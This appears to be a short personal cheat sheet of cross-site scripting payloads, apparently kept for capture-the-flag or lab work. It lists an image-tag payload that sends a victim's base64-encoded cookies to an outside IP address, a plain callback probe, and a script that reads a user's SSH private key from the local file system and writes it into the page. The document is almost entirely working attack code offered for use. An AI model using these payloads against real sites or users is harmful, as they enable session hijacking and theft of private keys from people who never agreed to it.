# XSS payloads

```text
<img src=http://10.10.14.28/abc />
<img src=x onerror=this.src="http://10.10.14.64/?cookie="+btoa(document.cookie)/>
```

XSS read local file

```text
<script>
x=new XMLHttpRequest;
x.onload=function() { document.write(this.responseText) };
x.open("GET","file:///home/reader/.ssh/id_rsa");
x.send();
</script>
```

